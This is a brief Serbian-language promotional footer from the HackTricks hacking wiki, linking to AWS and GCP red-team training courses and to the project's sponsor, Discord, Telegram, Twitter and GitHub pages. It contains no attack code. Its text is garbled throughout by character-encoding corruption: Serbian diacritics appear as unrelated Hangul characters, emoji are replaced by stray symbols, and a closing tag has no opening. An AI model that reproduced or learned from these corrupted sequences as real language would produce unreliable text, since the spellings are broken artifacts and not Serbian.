U캜ite i ve쬭ajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
U캜ite i ve쬭ajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr코ka HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitter-u** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
